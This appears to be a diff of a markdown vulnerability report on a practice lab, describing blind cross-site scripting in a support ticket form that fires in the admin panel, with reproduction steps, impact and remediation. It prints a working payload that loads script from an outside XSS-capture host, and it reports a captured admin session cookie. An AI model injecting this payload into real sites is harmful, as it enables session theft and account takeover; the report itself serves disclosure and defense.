@@ -1,23 +1,23 @@
----
+
 ## Title
 Blind Cross-Site Scripting (XSS) in Support Ticket Form executes in Admin Panel
 
----
+
 ## Vulnerability Type
 Blind XSS
 
----
+
 ## Summary
 I identified a blind XSS in the Support Ticket form. The Name, Subject and  Message feilds all accept and store raw HTML without any sanitization. The payload does not execute on the user side- it fires silently in the admin panel wehn an admin opens the ticket to review it. This was confirmed via XSS reporting tool which captured the admin's session cookie, URL, and full browser details the moment the payload executed.
 
----
+
 ## Vulnerable Endpoint
 ```
 http://kzlabs.com/64.php
 ```
 **Injection points** Name, Subject and  Message fields in the Support Ticket creation form
 
----
+
 ## Steps to Reproduce
 1. Navigate to the support Ticket form on the application
 ```
@@ -32,13 +32,13 @@ http://kzlabs.com/64.php
 5. Wait for the admin to log in and review it, the payload fires in the browser automatically 
 7. The XSS reporting tool at `xss.report` captures the execution including  admin's session cookie, URL and full browser details.
 
----
+
 ## Payload Used
 ```
 '"><script src=https://xss.report/c/ali1></script>
 ```
 
----
+
 ## Proof of Concept
 
 **Screenshot 1** — Support Ticket form showing the blind XSS payload entered in the Name, Subject and Your Message fields before submission.
@@ -58,14 +58,14 @@ http://kzlabs.com/64.php
 <img width="1553" height="964" alt="lab 64_" src="https://github.com/user-attachments/assets/81717fcf-37b7-46c6-872c-a8adcc5ad9e1" />
 
 
----
+
 ## Impact
 - The payload fires silently in the admin browser the moment admin open any support ticket - zero interaction needed beyond viewing the ticket
 - Full admin session cookie captured - PHPSESSID=zap_adm_6gpmkuo1o1h - attacker can paste this into their browser and be immediately logged in as admin with no password needed.
 - Since the admin has full access to all support tickets and user data a compromised admin account means full control over the entire platform
 - Complete account takeover
 
----
+
 ## Remediation
 1. Filter out HTML tags like `<script>`, `<img>`, `<svg>` from the Name, Subject and Message fields before saving anything to the database
 2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
